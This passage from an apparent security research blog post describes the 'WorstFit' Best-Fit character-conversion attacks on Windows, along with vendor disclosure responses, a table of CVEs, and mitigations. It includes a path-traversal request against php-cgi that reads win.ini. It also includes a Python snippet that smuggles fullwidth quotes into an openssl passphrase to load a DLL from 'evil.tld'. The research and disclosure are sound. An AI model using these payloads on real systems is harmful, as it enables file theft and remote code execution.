+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REDIRECT_URL=/index.php/foo/bar</span><br><span class="line">REQUEST_URI=/index.php/foo/bar</span><br><span class="line">PATH_INFO=/index.php/foo/bar</span><br><span class="line">PATH_TRANSLATED=C:\inetpub\wwwroot\index.php\foo\bar</span><br></pre></td></tr></table></figure>
+
+<p>Notice how the PHP script filename (<code>index.php</code>) and the additional path (<code>foo/bar</code>) are combined. From the environment variables alone, it’s unclear which part represents the PHP file and which is additional <code>PATH_INFO</code>. Resolving this ambiguity is left to <code>php-cgi.exe</code>. Hmm, it must be quite easy to make <code>php-cgi</code> confused right? </p>
+<p>The first thought might be to try something like <code>http://victim.tld/index.php/../../../secret.txt</code>. But this apparently won’t work, as the web server normalizes and validates paths before passing them to PHP-CGI. So, how can we bypass this? </p>
+<p>As we knew in the <strong>Filename Smuggling</strong> section, the Yen sign (<code>¥</code>) in the Japanese code page can be exploited. For example, by sending a request like <code>/index.php/..¥..¥windows/win.ini/foo</code>, you can potentially access arbitrary files. Here’s how it works:</p>
+<ul>
+<li><strong>Web Server’s Perspective</strong>: The server treats the entire <code>/..¥..¥windows/win.ini/foo</code> as additional <code>PATH_INFO</code> and processes it as part of the request.</li>
+<li><strong>PHP-CGI’s Perspective</strong>: PHP-CGI receives things like <code>REQUEST_URI=/index.php/..\..\windows/win.ini/foo</code> and struggles to differentiate between the actual PHP file (<code>index.php</code>) and the <code>PATH_INFO</code> portion. This confusion allows the exploit to manipulate the behavior and access files beyond intended restrictions.</li>
+</ul>
+<p>This mismatch between how components interpret the request opens the door to potential vulnerabilities. Depending on the web server’s behavior and configuration, this can turn into a file existence oracle on <strong>Apache</strong>:</p>
+<ul>
+<li><strong>Non-existing file</strong>: For a request like <code>/index.php/..¥..¥NONEXIST/</code>, PHP-CGI treats <code>/..¥..¥NONEXIST/</code> as additional <code>PATH_INFO</code> and renders <code>/index.php</code> as usual.  </li>
+<li><strong>Existing file</strong>: For a request like <code>/index.php/..¥..¥windows/win.ini/</code>, PHP-CGI fails and produces a <code>No input file specified</code> error due to how it handles valid files internally.</li>
+</ul>
+<p>But why stop at just checking file existence? On an <strong>IIS server</strong> with the <code>doc_root</code> directive configured, this can lead to <strong>Local File Inclusion (LFI)</strong>. Using a path like <code>/index.php/..¥..¥..¥windows/win.ini/</code>, you can effectively include and read arbitrary files, such as <code>C:\Windows\win.ini</code>.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab36.png"></p>
+<p>As an LFI vulnerability, this can surely escalate to a potential <strong>Remote Code Execution (RCE)</strong> in scenarios where the included file contains executable or user-controllable code.</p>
+<p><em><strong>Note</strong>: This specific scenario is rare in real-world applications, so we classify it more as a bug rather than a vulnerability.</em></p>
+<h2 id="The-Dusk–or-Dawn–of-the-WorstFit"><a href="#The-Dusk–or-Dawn–of-the-WorstFit" class="headerlink" title="The Dusk–or Dawn–of the WorstFit"></a>The Dusk–or Dawn–of the WorstFit</h2><p>As mentioned earlier, we have identified several issues across programming languages, open-source projects, and Windows built-in command-line programs. As responsible researchers, we promptly reported these issues to their respective upstream maintainers. However, this process was quite challenging, the most debated topic is revolved around the <strong>Argument Splitting</strong>, and this section highlights some obstacles we encountered during the reporting process.</p>
+<h4 id="🧐-Is-this-an-issue"><a href="#🧐-Is-this-an-issue" class="headerlink" title="🧐 Is this an issue?"></a>🧐 <strong>Is this an issue?</strong></h4><p>This was the most common question raised by vendors. Those in opposition argued that “passing user inputs to the command line in itself is already a vulnerability”. Even they are properly escaped or have sanitization in place, the root of the problem is still that “developers should avoid such practices altogether”.</p>
+<p>I am not sure if it’s fair to shift all the responsibility onto developers. Firstly, the operating system itself is already a scenario that highly requires user inputs. Additionally, with the increasing complexity of web applications, it is really difficult to completely eliminate user input.</p>
+<h4 id="🧐-Who-is-responsible-for-that"><a href="#🧐-Who-is-responsible-for-that" class="headerlink" title="🧐 Who is responsible for that?"></a>🧐 <strong>Who is responsible for that?</strong></h4><p>Even if we both agree that this is an issue, the next much challenging question is: “Who is responsible for it?” Since the problematic code is embedded automatically during compilation (the compiler attaches the entry <code>mainCRTStartup()</code>, which calls the ANSI API within MSVCRT&#x2F;UCRT), the responsibility becomes unclear. Is it because <strong>“the developer failed to use the correct <code>wmain()</code>”</strong>, or is it <strong>“CRT’s failure for not splitting the command line well and pass the wrong argument to <code>main()</code>”</strong>?</p>
+<p>To make things even more confusing, some projects only provide source code, leaving the prebuilt executable files distributed to be handled by third-party volunteers across the Internet. In such cases, who should be held accountable for the issue? Taking it a step further, could this even be considered a case of <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Backdoor_(computing)#Compiler_backdoors">compiler-introduced security vulnerabilities</a>? 😉</p>
+<h4 id="😖-It’s-really-hard-to-fix-it"><a href="#😖-It’s-really-hard-to-fix-it" class="headerlink" title="😖 It’s really hard to fix it!"></a>😖 <strong>It’s really hard to fix it!</strong></h4><p>I believe most maintainers would be willing to help with a quick fix, even if it wasn’t categorized as a security issue. However, resolving this problem isn’t that as simple as just replacing the <strong><code>main()</code></strong> with its wide-character counterpart. Since the function signature has been changed, maintainers would need to rewrite all variable definitions and argument parsing logics, converting everything from simple <strong><code>char *</code></strong> to <strong><code>wchar_t *</code></strong>. This process can be painful and error-prone. 😵‍💫</p>
+<br>
+
+<p>We have also summarized some responses we received as follows:</p>
+<h4 id="➤-Curl"><a href="#➤-Curl" class="headerlink" title="➤ Curl"></a>➤ Curl</h4><p>Curl said that this is a Windows feature and there are no plans to fix it. Interestingly, Microsoft’s <a target="_blank" rel="noopener" href="https://curl.se/windows/microsoft.html">ported Curl</a> has properly modified the entry to <code>wmain()</code> on the contrary, so the built-in <code>curl.exe</code> on Windows is not impacted, only the binaries delivered by official  Curl are affected by the Argument Splitting attack.</p>
+<p>Here are some responses from Curl. You can check the full report on <a target="_blank" rel="noopener" href="https://hackerone.com/reports/2550951">HackerOne</a>.</p>
+<blockquote>
+<p>I’m struggling to see how this is a curl problem. It looks like a Windows “feature” to me. It is being “helpful” and helps users to convert ascii-looking double quotes to ASCII double quotes.<br>&nbsp;<br>— 👤 Author of Curl</p>
+</blockquote>
+<blockquote>
+<p>If we can mitigate this we should probably consider that, but it is a hard problem and it certainly is not going to be solved in the short term. curl is a victim here, not the responsible party.<br>&nbsp;<br>— 👤 Author of Curl</p>
+</blockquote>
+<h4 id="➤-OpenSSL"><a href="#➤-OpenSSL" class="headerlink" title="➤ OpenSSL"></a>➤ OpenSSL</h4><p>This is an interesting case. OpenSSL provides an environment variable, <code>OPENSSL_WIN32_UTF8</code>, to handle arguments in Wide Character format. Although its original purpose was to correct issues with displaying UTF-8 in the UI, it also mitigates the Argument Splitting attack unintentionally! </p>
+<p>However, most developers are still unaware of the need to set this environment variable while using the <code>openssl.exe</code> executable. As a result,it is still possible to leverage the <code>-engine</code> argument to execute arbitrary code in a default OpenSSL usage.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">passphrase = <span class="string">&quot;pass\uFF02 \uFF02-engine\uFF02 \uFF02\\\\evil.tld\\malicious.dll&quot;</span></span><br><span class="line">subprocess.run([</span><br><span class="line">    <span class="string">&#x27;openssl.exe&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;enc&quot;</span>, </span><br><span class="line">    <span class="string">&quot;-aes-256-cbc&quot;</span>, </span><br><span class="line">    <span class="string">&quot;-in&quot;</span>, <span class="string">&quot;in.txt&quot;</span>, </span><br><span class="line">    <span class="string">&quot;-out&quot;</span>, <span class="string">&quot;out.txt&quot;</span>, </span><br><span class="line">    <span class="string">&quot;-k&quot;</span>, passphrase</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="➤-Perl"><a href="#➤-Perl" class="headerlink" title="➤ Perl"></a>➤ Perl</h4><p>The official Perl did not provide prebuilt executables for Windows. Instead, third-party installers such as <a target="_blank" rel="noopener" href="https://strawberryperl.com/">Strawberry Perl</a> or <a target="_blank" rel="noopener" href="https://www.activestate.com/products/perl/">ActiveState Perl</a> are commonly used, and both of which are affected by the Argument Splitting attack. After having a discuss with the Perl maintainer, they concluded that <strong>“This seems more like a Microsoft bug than a Perl bug,”</strong> so this issue remains unresolved in Perl for now.</p>
+<h4 id="➤-Microsoft"><a href="#➤-Microsoft" class="headerlink" title="➤ Microsoft"></a>➤ Microsoft</h4><p>We reported three cases to MSRC in total, but the communication process did not go well. All cases were initially rejected for not meeting their severity criteria. We re-opened the case several times and the Excel case was eventually accepted after our third attempt, while the other cases remain unresolved for today :(</p>
+<p>Here is the reply:</p>
+<blockquote>
+<p>The attack scenario here depends on a vulnerability in an unrelated application. The trick inherently requires a separate application that inserts untrusted input into a command line which is then executed. That in itself is a vulnerability; however, the technique which makes exploiting the issue possible does not qualify as a vulnerability.<br>&nbsp;<br>— 👤 MSRC</p>
+</blockquote>
+<h4 id="➤-Report-to-CERT-CC"><a href="#➤-Report-to-CERT-CC" class="headerlink" title="➤ Report to CERT&#x2F;CC"></a>➤ Report to CERT&#x2F;CC</h4><p>Since this is a systemic problem, we have also sought assistance from CERT&#x2F;CC, hoping to coordinate and collaborate in an effort to find a better solution to address this issue. Microsoft eventually added one more <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea#security-remarks">warning</a> in their documentation after several months of effort. However, they only put this warning in the <code>GetCommandLineA</code>. There are still several ANSI APIs that need attention! ¯\_(ツ)_&#x2F;¯ </p>
+<p>During the process of the vulnerability disclosure, we also investigated the open-source ecosystem to identify more affected applications, and tried to report them to their maintainers. Here is a list of what we have reported so far:</p>
+<table>
+<thead>
+<tr>
+<th>Report Date</th>
+<th align="left">Vendor</th>
+<th align="left">Status</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2024&#x2F;05&#x2F;07</td>
+<td align="left">PHP - <code>php-cgi.exe</code></td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv">CVE-2024-4577</a></td>
+</tr>
+<tr>
+<td>2024&#x2F;06&#x2F;13</td>
+<td align="left">Curl - <a target="_blank" rel="noopener" href="https://curl.se/windows/">Official Build</a></td>
+<td align="left"><a target="_blank" rel="noopener" href="https://hackerone.com/reports/2550951">Won’t Fix</a></td>
+</tr>
+<tr>
+<td>2024&#x2F;06&#x2F;13</td>
+<td align="left">Apache Subversion - <code>svn.exe</code></td>
+<td align="left"><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2024-45720">CVE-2024-45720</a></td>
+</tr>
+<tr>
+<td>2024&#x2F;06&#x2F;16</td>
+<td align="left">Microsoft Tar - <code>tar.exe</code></td>
+<td align="left">Won’t Fix</td>
+</tr>
+<tr>
+<td>2024&#x2F;06&#x2F;19</td>
+<td align="left">Microsoft Excel - <code>excel.exe</code></td>
+<td align="left"><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026">CVE-2024-49026</a></td>
+</tr>
+<tr>
+<td>2024&#x2F;06&#x2F;19</td>
+<td align="left">Microsoft PhoneBook - <code>rasphone.exe</code></td>
+<td align="left">Won’t Fix</td>
+</tr>
+<tr>
+<td>2024&#x2F;06&#x2F;19</td>
+<td align="left">Oracle Java - <code>java.exe</code></td>
+<td align="left">Pending Fix</td>
+</tr>
+<tr>
+<td>2024&#x2F;06&#x2F;19</td>
+<td align="left">Perl - <code>perl.exe</code></td>
+<td align="left">Won’t Fix</td>
+</tr>
+<tr>
+<td>2024&#x2F;07&#x2F;15</td>
+<td align="left">Perforce - <code>p4.exe</code></td>
+<td align="left"><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2024-8067">CVE-2024-8067</a></td>
+</tr>
+<tr>
+<td>2024&#x2F;08&#x2F;05</td>
+<td align="left">PostgreSQL - <code>psql.exe</code></td>
+<td align="left">Won’t Fix</td>
+</tr>
+<tr>
+<td>2024&#x2F;08&#x2F;08</td>
+<td align="left">Putty - <code>plink.exe</code></td>
+<td align="left">Fixed</td>
+</tr>
+<tr>
+<td>2024&#x2F;08&#x2F;19</td>
+<td align="left">OpenSSL - <code>openssl.exe</code></td>
+<td align="left">Other</td>
+</tr>
+<tr>
+<td>2024&#x2F;08&#x2F;19</td>
+<td align="left">wkhtmltopdf - <code>wkhtmltopdf.exe</code></td>
+<td align="left">EOL</td>
+</tr>
+<tr>
+<td>2024&#x2F;08&#x2F;19</td>
+<td align="left">GNU Wget</td>
+<td align="left">No Reply</td>
+</tr>
+</tbody></table>
+<h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>So far, we have summarized attacks on WorstFit, including <strong>Filename Smuggling</strong>, <strong>Argument Splitting</strong>, and <strong>Environment Variable Confusion</strong>. Each attack has its applicable Code Pages. You can check the following table to see if you are at risk or not.</p>
+<p><em>↓ Table of Affected Code Pages:</em></p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab18.png"></p>
+<p><em>↓ World Map of WorstFit:</em></p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab56.png"></p>
+<h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>As for how to mitigate such attacks, unfortunately, since this is an operating system-level problem, similar issues will continue to reappear — until Microsoft chooses to enable UTF-8 by default in all of their Windows editions. Before that, the only thing we can do is to encourage everyone, the users, organizations, and developers, to gradually phase out ANSI and promote the use of the Wide Character API, transiting the environment to a safer world step by step!</p>
+<p><strong>As a user</strong>, the only thing you can do is to check the UTF-8 option on your Windows. However, since this feature is still in the BETA phase, it’s uncertain whether it will cause side effects or not.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab12.png"></p>
+<br>
+
+<p><strong>As a developer</strong>, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170"><code>_wgetcwd</code></a> and <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170"><code>_wgetenv</code></a>. Otherwise, Otherwise, the underlying implementation can still call the ANSI API, which is vulnerable to our WorstFit attacks, too!</p>
+<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>We hope this article provides you with an overview and enough insights to understand WorstFit Attack. Of course, this is not the end. Considering Windows’ commitment towards backward compatibility, you can imagine there are more hidden places the ANSI API would appear, for example, the Windows Registry queries like <code>RegQueryValueA</code> are definitely affected but need to find a vulnerable scenario, and we also observed Best-Fit behavior in Active Directory! 😉</p>
+<p>We encourage more researchers to explore this attack surface and look forward to see more vulnerabilities in the future!</p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2025
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
